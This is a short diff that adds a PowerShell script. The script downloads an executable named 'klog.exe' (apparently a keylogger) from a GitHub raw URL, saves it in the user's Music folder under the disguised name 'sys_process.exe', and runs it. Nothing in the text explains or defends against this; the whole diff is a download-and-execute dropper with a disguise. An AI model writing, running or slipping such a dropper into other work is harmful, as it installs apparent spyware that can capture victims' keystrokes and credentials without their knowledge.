@@ -1,0 +1,5 @@
+$dlUrl = "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/klog.exe"
+$dlPath = Join-Path -Path $env:USERPROFILE -ChildPath "Music\sys_process.exe"
+Invoke-WebRequest -Uri $dlUrl -OutFile $dlPath
+cd $env:USERPROFILE
+.\Music\sys_process.exe
